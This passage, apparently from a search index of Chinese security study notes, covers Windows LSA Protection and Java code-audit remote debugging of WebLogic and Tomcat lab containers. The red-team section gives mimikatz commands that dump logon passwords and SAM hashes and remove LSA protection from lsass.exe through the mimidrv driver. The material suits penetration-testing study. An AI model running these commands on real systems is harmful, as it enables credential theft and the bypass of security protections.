\u5f15\u5165\u4e86 LSA \u4fdd\u62a4\u529f\u80fd\u3002LSA \u4fdd\u62a4\u901a\u8fc7\u5c06 LSASS \u8fdb\u7a0b\u6807\u8bb0\u4e3a\u53d7\u4fdd\u62a4\u8fdb\u7a0b\uff0c\u5e76\u9650\u5236\u5bf9\u5176\u5185\u5b58\u548c\u6570\u636e\u7684\u8bbf\u95ee\uff0c\u4ee5\u9632\u6b62\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u6216\u6076\u610f\u64cd\u4f5c\u3002LSA \u4fdd\u62a4\u8fd8\u53ef\u4ee5\u4e0e\u5176\u4ed6\u5b89\u5168\u529f\u80fd\u7ed3\u5408\u4f7f\u7528\uff0c\u4f8b\u5982 Credential Guard \u548c Device Guard\uff0c\u4ee5\u63d0\u4f9b\u66f4\u5168\u9762\u7684\u5b89\u5168\u6027\u3002</p> <p>\u81eaWindows 8.1 \u5f00\u59cb\u4e3aLSA\u63d0\u4f9b\u4e86\u989d\u5916\u7684\u4fdd\u62a4\uff08LSA Protection\uff09\uff0c\u4ee5\u9632\u6b62\u8bfb\u53d6\u5185\u5b58\u548c\u4e0d\u53d7\u4fdd\u62a4\u7684\u8fdb\u7a0b\u6ce8\u5165\u4ee3\u7801\u3002\u4fdd\u62a4\u6a21\u5f0f\u8981\u6c42\u6240\u6709\u52a0\u8f7d\u5230LSA\u7684\u63d2\u4ef6\u90fd\u5fc5\u987b\u4f7f\u7528Microsoft\u7b7e\u540d\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002 \u5728LSA Protection\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0cmimikatz\u8fd0\u884c sekurlsa::logonpasswords\u6293\u53d6\u5bc6\u7801\u4f1a\u62a5\u9519\u3002</p> <p>\u67e5\u8be2\u662f\u5426\u542f\u7528\uff1a<code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa</code></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#1-lsa-protection","title":"1.\u5f00\u542f LSA Protection","text":"<p>\u6d4b\u8bd5\u73af\u5883\uff1aWindows 10 X64</p> <p>\u53ef\u4ee5\u901a\u8fc7\u6ce8\u518c\u8868\u5f00\u542fLSA Protection\uff0c\u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa</code> \u65b0\u5efa-DWORD\uff0832\uff09\u503c\uff0c\u540d\u79f0\u4e3a RunAsPPL,\u6570\u503c\u4e3a 00000001\uff0c\u7136\u540e\u91cd\u542f\u7cfb\u7edf\u751f\u6548\u3002</p> <pre><code>REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"RunAsPPL\" /t REG_DWORD /d \"00000001\" /f\n</code></pre> <p>\u7528\u4e8e\u5728 Windows \u6ce8\u518c\u8868\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u952e\u503c\uff0c\u5176\u4f5c\u7528\u662f\u8bbe\u7f6e\u7cfb\u7edf\u4e2d\u7684\u201cRunAsPPL\u201d\u53c2\u6570\u3002\u5177\u4f53\u800c\u8a00\uff1a</p> <ul> <li> <p>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa \u662f\u6ce8\u518c\u8868\u4e2d\u7684\u4e00\u4e2a\u952e\u8def\u5f84\uff0c\u5b83\u6307\u5411 Windows \u7cfb\u7edf\u7684 LSA\uff08Local Security Authority\uff09\u5b50\u7cfb\u7edf\u8bbe\u7f6e\u3002</p> </li> <li> <p>/v \"RunAsPPL\" \u6307\u5b9a\u8981\u6dfb\u52a0\u6216\u4fee\u6539\u7684\u503c\u540d\u79f0\uff0c\u8fd9\u91cc\u662f\u201cRunAsPPL\u201d\u3002</p> </li> <li> <p>/t REG_DWORD \u8868\u793a\u503c\u7684\u6570\u636e\u7c7b\u578b\u662f DWORD\uff08\u53cc\u5b57\uff09\u3002</p> </li> <li> <p>/d \"00000001\" \u6307\u5b9a\u8981\u8bbe\u7f6e\u7684 DWORD \u503c\u7684\u6570\u636e\u3002\u5728\u8fd9\u91cc\uff0c\u503c\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u8fd9\u610f\u5473\u7740\u542f\u7528\u4e86\u201cRunAsPPL\u201d\u529f\u80fd\u3002</p> </li> <li> <p>/f \u6807\u5fd7\u8868\u793a\u5f3a\u5236\u6267\u884c\uff0c\u5373\u4f7f\u5df2\u5b58\u5728\u540c\u540d\u7684\u952e\u6216\u503c\u4e5f\u8981\u8fdb\u884c\u64cd\u4f5c\u3002</p> </li> </ul> <p>\u201cRunAsPPL\u201d \u662f Windows \u4e2d\u7684\u4e00\u9879\u5b89\u5168\u8bbe\u7f6e\uff0c\u7528\u4e8e\u542f\u7528 Protected Process Light \uff08PPL\uff09\u7279\u6027\uff0c\u8fd9\u662f\u4e00\u79cd\u63d0\u9ad8\u7cfb\u7edf\u5b89\u5168\u6027\u7684\u529f\u80fd\u3002\u542f\u7528\u540e\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u4f1a\u4ee5\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u4ee5\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u3002</p> <p></p> <p>\u9a8c\u8bc1LSA\u662f\u5426\u4ee5\u4fdd\u62a4\u6a21\u5f0f\u542f\u52a8\uff0c\u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\uff0c\u4e8b\u4ef6id\u4e3a12-LSASS.exe\u4f5c\u4e3a\u53d7\u4fdd\u62a4\u7684\u8fdb\u7a0b\u542f\u52a8\uff1a</p> <p></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#2lsa-protectionsekurlsalogonpasswords","title":"2.LSA Protection\u8fd0\u884c\u4e0b\u7684sekurlsa::logonpasswords","text":"<p>\u5728\u5f00\u542fLSA Protection\u65f6\uff0cmimikatz\u8fd0\u884c sekurlsa::logonpasswords\u4f1a\u62a5\u9519 \u201cERROR kuhl_m_sekurlsa_acquireLSA\uff1bHandle on memery\u201d</p> <pre><code>mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n</code></pre> <p></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#3lsadumpsam-bypass","title":"3.lsadump::sam   bypass","text":"<p>mimikatz \u8fd0\u884c lsadump :: sam \u4ece\u78c1\u76d8\u4e0a\u7684SAM\u8bfb\u53d6\u51ed\u636e\uff0c\u53ef\u6210\u529fpypass LSA Protection\uff0c\u8bfb\u53d6\u5230\u7528\u6237\u54c8\u5e0c</p> <pre><code>mimikatz # privilege::debug\nmimikatz # token::whoami\nmimikatz # token::elevate\nmimikatz # lsadump::sam\n</code></pre> <p></p>"},{"location":"CTF/Red_Team_Commands/Article1/index.html#4mimidrvsys-bypass","title":"4.mimidrv.sys   bypass","text":"<p>mimikatz\u5176\u4e2d\u7684mimidrv.sys\u9a71\u52a8\u7a0b\u5e8f\uff0c\u53ef\u4ecelsass.exe\u8fdb\u7a0b\u4e2d\u5220\u9664LSA\u4fdd\u62a4\uff0c\u6210\u529fbypass LSA Protection\u3002</p> <pre><code>mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\n</code></pre> <p></p>"},{"location":"Code_audit/index.html","title":"\u4ee3\u7801\u5ba1\u8ba1","text":"<ul> <li>Java\u4ee3\u7801\u5ba1\u8ba1\u601d\u8def\u4e0e\u8c03\u8bd5\u65b9\u6cd5</li> <li>Java EE MVC servlet filter</li> <li>SpringMVC\u5b9e\u73b0\u6b65\u9aa4</li> <li>ClassLoader \u7c7b\u52a0\u8f7d\u673a\u5236 \u52a8\u6001\u4ee3\u7406</li> <li>Java EE \u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1</li> </ul>"},{"location":"Code_audit/Java/Java-1/Java1.html","title":"\u4ee3\u7801\u5ba1\u8ba1\u5e38\u7528\u601d\u8def","text":"<ol> <li>\u63a5\u53e3\u6392\u67e5\uff08\u201c\u6b63\u5411\u8ffd\u8e2a\u201d\uff09\uff1a\u5148\u627e\u51fa\u4ece\u5916\u90e8\u63a5\u53e3\u63a5\u6536\u7684\u53c2\u6570\uff0c\u5e76\u8ddf\u8e2a\u5176\u4f20\u9012\u8fc7\u7a0b\uff0c\u89c2\u5bdf\u662f\u5426\u6709\u53c2\u6570\u6821\u9a8c\u4e0d\u4e25\u7684\u53d8\u91cf\u4f20\u5165\u9ad8\u5371\u65b9\u6cd5\u4e2d\uff0c\u6216\u8005\u5728\u4f20\u9012\u7684\u8fc7\u7a0b\u4e2d\u662f\u5426\u6709\u4ee3\u7801\u903b\u8f91\u6f0f\u6d1e\u3002</li> <li>\u5371\u9669\u65b9\u6cd5\u6eaf\u6e90\uff08\u201c\u9006\u5411\u8ffd\u8e2a\u201d\uff09\uff1a\u68c0\u67e5\u654f\u611f\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5e76\u67e5\u770b\u53c2\u6570\u7684\u4f20\u9012\u4e0e\u5904\u7406\uff0c\u5224\u65ad\u53d8\u91cf\u662f\u5426\u53ef\u63a7\u5e76\u4e14\u5df2\u7ecf\u8fc7\u4e25\u683c\u7684\u8fc7\u6ee4\u3002</li> <li>\u529f\u80fd\u70b9\u5b9a\u5411\u5ba1\u8ba1\uff1a\u6839\u636e\u7ecf\u9a8c\u5224\u65ad\u8be5\u7c7b\u5e94\u7528\u901a\u5e38\u4f1a\u5728\u54ea\u4e9b\u529f\u80fd\u4e2d\u51fa\u73b0\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5ba1\u8ba1\u8be5\u7c7b\u529f\u80fd\u7684\u4ee3\u7801\u3002</li> <li>\u7b2c\u4e09\u65b9\u7ec4\u4ef6\u3001\u4e2d\u95f4\u4ef6\u7248\u672c\u6bd4\u5bf9\uff1a\u68c0\u67e5 Web \u5e94\u7528\u6240\u4f7f\u7528\u7684\u7b2c\u4e09\u65b9\u7ec4\u4ef6\u6216\u4e2d\u95f4\u4ef6\u7684\u7248\u672c\u662f\u5426\u53d7\u5230\u5df2\u77e5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002</li> <li>\u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1\uff1a\u5ba1\u8ba1 Web \u5e94\u7528\u6240\u4f7f\u7528\u7684\u5f00\u53d1\u6846\u67b6\u662f\u5426\u5b58\u5728\u81ea\u8eab\u5b89\u5168\u6027\u95ee\u9898\uff0c\u6216\u8005\u7531\u4e8e\u7528\u6237\u4f7f\u7528\u4e0d\u5f53\u800c\u5f15\u53d1\u7684\u5b89\u5168\u98ce\u9669\u3002</li> <li>\u8865\u4e01\u6bd4\u5bf9\uff1a\u901a\u8fc7\u5bf9\u8865\u4e01\u505a\u6bd4\u5bf9\uff0c\u53cd\u63a8\u6f0f\u6d1e\u51fa\u5904\u3002</li> </ol>"},{"location":"Code_audit/Java/Java-1/Java1.html#_2","title":"\u8fdc\u7a0b\u8c03\u8bd5","text":"<p>IntelliJ IDEA \u53ef\u4ee5\u5728\u65e0\u6e90\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5\uff0c\u53ea\u9700\u5c06\u7a0b\u5e8f\u7684 class \u6587\u4ef6\u6216 Jar \u5305\u6dfb\u52a0\u8fdb\u9879\u76ee\u4f9d\u8d56\u5373\u53ef\u5bf9\u4e00\u4e9b\u672a\u5f00\u6e90\u7684 Java \u7a0b\u5e8f\u6216\u5927\u578b\u4e2d\u95f4\u4ef6\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5\u3002</p>"},{"location":"Code_audit/Java/Java-1/Java1.html#jar","title":"\u5bf9 Jar \u5305\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5","text":"<p>\u4f7f\u7528 IntelliJ IDEA \u521b\u5efa\u4e00\u4e2a Java \u9879\u76ee\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a lib \u6587\u4ef6\u5939\u5c06 Jar \u5305\u653e\u5165\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u9009\u4e2d lib \u6587\u4ef6\u5939\u540e\uff0c\u53f3\u952e\u9009\u62e9\u201cAdd as Library\u2026\u201d\uff0c\u5c06 lib \u6587\u4ef6\u5939\u6dfb\u52a0\u8fdb\u9879\u76ee\u4f9d\u8d56\u3002\u6210\u529f\u6dfb\u52a0\u540e\u53ef\u4ee5\u770b\u5230 Jar \u5305\u4e2d\u53cd\u7f16\u8bd1\u540e\u7684\u6e90\u4ee3\u7801\u3002</p> <p></p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u53f3\u4e0a\u89d2\u7684\u201cAdd Configurations\u201d\uff0c\u5e76\u5355\u51fb\u201c+\u201d\u6765\u6dfb\u52a0\u4e00\u4e2a\u201cRemote\u201d\u3002\u9ed8\u8ba4\u914d\u7f6e\u754c\u9762\u5982\u56fe\u793a\uff0c\u5355\u51fb\u201cApply\u201d\u63d0\u4ea4\u5e76\u4fdd\u5b58\u5373\u53ef\u3002\u5176\u4e2d\u201c-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\u201d\u5c06\u4f5c\u4e3a\u8fd0\u884c\u65f6\u7684\u542f\u52a8\u53c2\u6570\u3002</p> <p></p> <p>IDEA \u4e2d\u9ed8\u8ba4\u914d\u7f6e\u8fdc\u7a0b\u8c03\u8bd5\u8bbe\u7f6e</p> <p></p> <p>\u5c06\u201c-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\u201d\u4f5c\u4e3a\u542f\u52a8\u53c2\u6570\u8fd0\u884c Jar \u5305\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002suspend \u8868\u793a\u662f\u5426\u6682\u505c\u7a0b\u5e8f\u7b49\u5f85\u8c03\u8bd5\u5668\u7684\u8fde\u63a5\uff0c\u201cy\u201d\u8868\u793a\u6682\u505c\uff0c\u201cn\u201d\u8868\u793a\u4e0d\u6682\u505c\u3002\u5efa\u8bae\u9009\u62e9\u6682\u505c\uff0c\u907f\u514d\u7a0b\u5e8f\u6267\u884c\u8fc7\u5feb\u5bfc\u81f4\u4e00\u4e9b\u65ad\u70b9\u65e0\u6cd5\u62e6\u622a\u7a0b\u5e8f\u3002</p> <pre><code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 -jar apktool_2.6.0.jar\n</code></pre> <p></p> <p>\u5355\u51fb IntelliJ IDEA \u53f3\u4e0a\u89d2\u7684 Debug \u6309\u94ae\uff0c\u5373\u53ef\u53d1\u73b0\u7a0b\u5e8f\u5728\u65ad\u70b9\u5904\u6682\u505c\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8fdb\u884c\u9010\u6b65\u7684\u8c03\u8bd5\u4e86\u3002</p> <p></p> <p>\u8fdc\u7a0b\u8c03\u8bd5\u6210\u529f</p> <p></p>"},{"location":"Code_audit/Java/Java-1/Java1.html#weblogic","title":"\u5bf9 Weblogic \u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5","text":"<p>\u8fdb\u5165/weblogic/CVE-2017-10271 \u6587\u4ef6\u5939\uff0c\u4fee\u6539\u5176\u4e2d\u7684 docker-compose.yml \u6587\u4ef6\uff0c\u5c06 8453 \u7aef\u53e3\u6253\u5f00\u3002</p> <p></p> <p>\u4f7f\u7528 docker-compose \u547d\u4ee4 docker-compose up -d \u7f16\u8bd1\u955c\u50cf\u5e76\u542f\u52a8\u5bb9\u5668\u3002\u5bb9\u5668\u6210\u529f\u542f\u52a8\uff0c\u5f00\u542f 8453 \u7aef\u53e3\u5e76\u4e14\u6620\u5c04\u5230\u672c\u673a\u3002</p> <p></p> <p>\u4f7f\u7528 docker exec -it 3d /bin/bash \u547d\u4ee4\u8fdb\u5165\u5bb9\u5668\uff0c\u4f7f\u7528 vi \u4fee\u6539\u6587\u4ef6/root/Oracle/ Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh\u3002\u5728\u4e0b\u56fe\u6240\u793a\u4ee3\u7801\u6bb5\u5904\u6dfb\u52a0\u5982\u4e0b\u4e24\u884c\u4ee3\u7801\u3002</p> <pre><code>ebugFlag=\"true\" \nexport debugFlag\n</code></pre> <p></p> <p>\u4f7f\u7528 docker restart \u547d\u4ee4\u91cd\u542f\u5bb9\u5668\uff0c\u518d\u8fdb\u5165\u5bb9\u5668\uff0c\u5c06/root/Oracle/Middleware \u6587\u4ef6\u5939\u4e0b\u7684 modules \u6587\u4ef6\u5939\u548c wlserver_10.3 \u6587\u4ef6\u5939\u4f7f\u7528 zip \u547d\u4ee4\u538b\u7f29\u6210 zip \u538b\u7f29\u5305\u3002\u5bb9\u5668\u4e2d\u662f\u4e00\u4e2a\u7b80\u6613\u7684 Linux \u7cfb\u7edf\uff0c\u9700\u8981\u6267\u884c apt-get install zip \u6765\u5b89\u88c5 zip \u538b\u7f29\u529f\u80fd\u3002Windows\u547d\u4ee4\u884c\u5bf9\u8def\u5f84\u957f\u5ea6\u6709\u9650\u5236\uff0c\u5982\u679c\u76f4\u63a5\u4f7f\u7528 docker \u7684 cp \u6307\u4ee4\uff0c\u5c31\u4f1a\u5728\u590d\u5236\u4e00\u4e9b\u957f\u6587\u4ef6\u540d\u7684\u6587\u4ef6\u65f6\u62a5\u9519\uff0c\u56e0\u6b64\u8fd9\u4e00\u6b65\u7684\u76ee\u7684\u662f\u6253\u5305\u6210\u538b\u7f29\u6587\u4ef6\u518d\u8fdb\u884c\u590d\u5236\uff0c\u4ee5\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u7684\u51fa\u73b0\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u4f7f\u7528 docker \u7684 cp \u6307\u4ee4\u5206\u522b\u5c06 modules.zip \u548c wlserver_ 10.3.zip \u590d\u5236\u81f3\u672c\u673a\u5f53\u524d\u8def\u5f84\u7684 test \u6587\u4ef6\u5939\u4e2d\u3002</p> <p></p> <p>\u5c06\u8be5\u6587\u4ef6\u79fb\u52a8\u81f3\u4e00\u4e2a\u9879\u76ee\u6587\u4ef6\u4e2d\uff0c\u5e76\u4f7f\u7528 IDEA \u6253\u5f00\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u9009\u4e2dw1server_10.3/server/lib \u6587\u4ef6\u548c modules \u6587\u4ef6\u5e76\u53f3\u952e\u5355\u51fb\uff0c\u9009\u62e9\u201cAdd as Library\u2026\u201d\u6dfb\u52a0\u4f9d\u8d56\u6587\u4ef6\u3002</p> <p></p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5355\u51fb IDEA \u53f3\u4e0a\u89d2\u7684\u201cAdd Configurations\u201d\u6309\u94ae\uff0c\u5728\u5f39\u51fa\u7684\u9009\u9879\u6846\u4e2d\u5355\u51fb\u5de6\u4e0a\u89d2\u7684\u201c+\u201d\u8fdb\u884c\u201cAdd New Configurations\u201d\u64cd\u4f5c\u3002\u7136\u540e\u5728\u4e0b\u62c9\u6846\u4e2d\u627e\u5230 Remote \u9009\u9879\u5e76\u5355\u51fb\uff0c\u8fdb\u5165\u540e\u56fe\u6240\u793a\u7684\u914d\u7f6e\u9875\u9762\uff0c\u586b\u5199\u7aef\u53e3\u53f7\u4e3a 8453\uff0c\u6ce8\u610f\uff0c\u9700\u8981\u4e0e\u7b2c\u4e00\u6b65\u5728 docker-compose.yml \u6587\u4ef6\u4e2d\u7684\u586b\u5199\u5185\u5bb9\u4fdd\u6301\u4e00\u81f4\u3002\u586b\u5199\u5b8c\u6bd5\uff0c\u5355\u51fb\u201cApply\u201d\u6309\u94ae\u5e94\u7528\u914d\u7f6e\uff0c\u518d\u5355\u51fb\u201cOK\u201d\u6309\u94ae\u5173\u95ed\u914d\u7f6e\u9875\u9762\u5373\u53ef\u3002</p> <p></p> <p>\u914d\u7f6e\u8fdc\u7a0b\u8c03\u8bd5</p> <p></p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5728 wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/ WLSServletAdapter.class \u7684 hadle \u65b9\u6cd5\u5904\u8bbe\u7f6e\u65ad\u70b9\uff0c\u63a5\u7740\u5355\u51fb\u53f3\u4e0a\u89d2\u7684 Debug \u6309\u94ae\uff08\u7eff\u8272\u5c0f\u866b\u5b50\u56fe\u6807\uff09\u8fd0\u884c Debug \u6a21\u5f0f\u3002\u7136\u540e\u4f7f\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:7001/ wls-wsat/CoordinatorPortType\uff0c\u540c\u65f6\u67e5\u770b IDEA \u662f\u5426\u5982\u540e\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u5728\u65ad\u70b9\u5904\u505c</p> <p></p> <p>\u6b62\u3002\u5f53\u7a0b\u5e8f\u6210\u529f\u5728\u65ad\u70b9\u5904\u505c\u6b62\u8fd0\u884c\u65f6\uff0c\u8868\u793a\u8fdc\u7a0b\u8c03\u8bd5\u914d\u7f6e\u6210\u529f\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u50cf\u8c03\u8bd5\u672c\u5730\u7a0b\u5e8f\u4e00\u6837\u8c03\u8bd5 Docker \u4e2d\u7684 Weblogic \u5e94\u7528\u4e86\u3002</p> <p></p>"},{"location":"Code_audit/Java/Java-1/Java1.html#tomcat","title":"\u5bf9 Tomcat \u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5","text":"<p>\u8fdb\u5165 Vulhub \u4e2d CVE-2017-12615 \u6f0f\u6d1e\u73af\u5883\u6240\u5728\u7684\u6587\u4ef6\u5939\uff0c\u5982\u56fe 2-43 \u6240\u793a\uff0c\u4fee\u6539docker-compose.yml \u6587\u4ef6\uff0c\u5c06 5005 \u7aef\u53e3\u5f00\u542f</p> <p></p> <p>\u4f7f\u7528 docker-compose up \u2013d \u547d\u4ee4\u5feb\u901f\u542f\u52a8 CVE-2017-12615 \u6f0f\u6d1e\u9a8c\u8bc1\u73af\u5883\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fdb\u5165\u5bb9\u5668\u4e2d\uff0c\u5e76\u5728/usr/local/tomcat/bin/catalina.sh \u63d2\u5165\u547d\u4ee4Java_OPTS=\"-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005\"\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bb9\u5668\u4e2d\u4e8b\u5148\u672a\u5b89\u88c5 Vim \u7f16\u8f91\u5668\uff0c\u9700\u8981\u5148\u4f7f\u7528 apt-get install vim \u547d\u4ee4\u8fdb\u884c\u5b89\u88c5\u3002\u4fee\u6539\u5b8c\u6bd5\u540e\uff0c\u9000\u51fa\u5bb9\u5668\uff0c\u5e76\u91cd\u542f\u5bb9\u5668\u3002</p> <p></p> <p>\u4f7f\u7528 docker cp \u547d\u4ee4\uff0c\u5c06/usr/local/tomcat/lib \u6587\u4ef6\u5939\u590d\u5236\u81f3\u7269\u7406\u673a\u3002\u518d\u4f7f\u7528 IDEA\u6253\u5f00\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u53f3\u952e\u9009\u4e2d lib \u6587\u4ef6\u5939\u5e76\u9009\u62e9\u201cAdd as Library\u2026\u201d\u9009\u9879\u6dfb\u52a0\u4f9d\u8d56\u6587\u4ef6\u3002</p> <p></p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5355\u51fb IDEA \u53f3\u4e0a\u89d2\u7684\u201cAdd Configurations\u201d\uff0c\u5728\u5f39\u51fa\u7684\u9009\u9879\u6846\u91cc\u5355\u51fb\u5de6\u4e0a\u89d2\u7684\u201c+\u201d\u8fdb\u884c\u201cAdd New Configuration\u201d\u64cd\u4f5c\u3002\u7136\u540e\u4e0b\u62c9\u627e\u5230 Remote \u9009\u9879\u5e76\u5355\u51fb\uff0c\u8fdb\u5165\u56fe\u4e8c\u6240\u793a\u7684\u914d\u7f6e\u9875\u9762\uff0c\u586b\u5199\u7aef\u53e3\u53f7\u4e3a 8453\uff0c\u6ce8\u610f\uff0c\u9700\u548c\u7b2c\u4e00\u6b65\u5728docker-compose.yml \u6587\u4ef6\u91cc\u586b\u5199\u7684\u5185\u5bb9\u4fdd\u6301\u4e00\u81f4\u3002\u586b\u5199\u5b8c\u6bd5\uff0c\u5355\u51fb\u201cApply\u201d\u6309\u94ae\u5e94\u7528\u8bbe\u7f6e\uff0c\u518d\u5355\u51fb\u201cOK\u201d\u6309\u94ae\u5173\u95ed\u914d\u7f6e\u9875\u9762\u5373\u53ef\u3002\u5982\u56fe\u4e09\u6240\u793a\uff0c\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5355\u51fb IDEA \u53f3\u4e0a\u89d2 Debug \u8fd0\u884c\uff08\u7eff\u8272\u5c0f\u866b\u5b50\u6807\u5fd7\uff09\uff0c\u7136\u540e\u4f7f\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:8080\uff0c\u4f1a\u53d1\u73b0\u7a0b\u5e8f\u5df2\u5728\u65ad\u70b9\u5904\u6682\u505c\uff0c\u8fd9\u5c31\u53ef\u4ee5\u50cf\u8c03\u8bd5\u672c\u5730\u7a0b\u5e8f\u4e00\u6837\u8c03\u8bd5 Docker \u4e2d\u7684 Tomcat\u3002</p> <p></p> <p>\u914d\u7f6e\u8fdc\u7a0b\u8c03\u8bd5\u7aef\u53e3</p> <p></p> <p></p>"},{"location":"Code_audit/Java/Java-2/Java2.html","title":"Java2","text":"<p>Java \u5e73\u53f0\u6709 3 \u4e2a\u4e3b\u8981\u7248\u672c\uff0c\u5206\u522b\u662f Java SE\uff08Java Platform Standard Edition\uff0cJava\u5e73\u53f0\u6807\u51c6\u7248\uff09\u3001Java EE\uff08Java Platform Enterprise Edition\uff0cJava \u5e73\u53f0\u4f01\u4e1a\u7248\uff09\u548c Java ME\uff08Java Platform Micro Edition\uff0cJava \u5e73\u53f0\u5fae\u578b\u7248\uff09\u3002\u5176\u4e2d\uff0cJava EE \u662f Java \u5e94\u7528\u6700\u5e7f\u6cdb\u7684\u7248\u672c\u3002Java EE \u4e5f\u79f0\u4e3a Java 2 Platform \u6216 Enterprise Edition\uff08J2EE\uff09\u3002Java EE \u53ef\u4ee5\u8bf4\u662f\u4e00\u4e2a\u6846\u67b6\uff0c\u4e5f\u53ef\u4ee5\u8bf4\u662f\u4e00\u79cd\u89c4\u8303\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-ee","title":"Java EE \u5206\u5c42\u6a21\u578b","text":""},{"location":"Code_audit/Java/Java-2/Java2.html#java-ee_1","title":"Java EE \u7684\u6838\u5fc3\u6280\u672f","text":"<p>Java EE \u7684\u6838\u5fc3\u6280\u672f\u6709\u5f88\u591a\uff0c\u5305\u62ec JDBC\u3001JNDI\u3001EJB\u3001RMI\u3001Servlet\u3001JSP\u3001XML\u3001JMS\u3001Java IDL\u3001JTS\u3001JTA\u3001JavaMail \u548c JAF\u3002\u8fd9\u91cc\u4ec5\u89e3\u91ca\u90e8\u5206\u5e38\u7528\u6280\u672f\u7684\u91ca\u4e49\u3002</p> <ul> <li> <p>Java\u6570\u636e\u5e93\u8fde\u63a5(Java Database Connectivity , JDBC) \u5728Java\u4e2d\u7528\u6765\u89c4\u8303\u5ba2\u6237\u7aef\u7a0b\u5e8f\u5982\u4f55\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\uff0c\u63d0\u4f9b\u4e86\u8bf8\u5982\u67e5\u8be2\u548c\u66f4\u65b0\u6570\u636e\u5e93\u4e2d\u6570\u636e\u7684\u65b9\u6cd5</p> </li> <li> <p>Java\u547d\u4ee4\u548c\u76ee\u5f55\u63a5\u53e3(Java Naming and Directory Interface,JNDI)\u662fJava\u7684\u4e00\u4e2a\u76ee\u5f55\u670d\u52a1\u5e94\u7528\u7a0b\u5e8f\u754c\u9762(API),\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u5f55\u7cfb\u7edf\uff0c\u5e76\u5c06\u670d\u52a1\u540d\u79f0\u4e0e\u5bf9\u8c61\u5173\u8054\u8d77\u6765\uff0c\u4ece\u800c\u4f7f\u5f97\u5f00\u53d1\u4eba\u5458\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u7528\u540d\u79f0\u6765\u8bbf\u95ee\u5bf9\u8c61\u3002</p> </li> <li>\u4f01\u4e1a\u7ea7 JavaBean\uff08Enterprise JavaBean\uff0cEJB\uff09\u662f\u4e00\u4e2a\u7528\u6765\u6784\u7b51\u4f01\u4e1a\u7ea7\u5e94\u7528\u7684\u3001\u5728\u670d\u52a1\u5668\u7aef\u53ef\u88ab\u7ba1\u7406\u7684\u7ec4\u4ef6\u3002</li> <li>\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08Remote Method Invocation\uff0cRMI\uff09\u662f Java \u7684\u4e00\u7ec4\u62e5\u62a4\u5f00\u53d1\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u7684 API,\u5b83\u5927\u5927\u589e\u5f3a\u4e86 Java \u5f00\u53d1\u5206\u5e03\u5f0f\u5e94\u7528\u7684\u80fd\u529b\u3002</li> <li>\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00\uff08eXtensible Markup Language\uff0cXML\uff09\u662f\u88ab\u8bbe\u8ba1\u7528\u4e8e\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\u7684\u8bed\u8a00\u3002</li> <li>Java 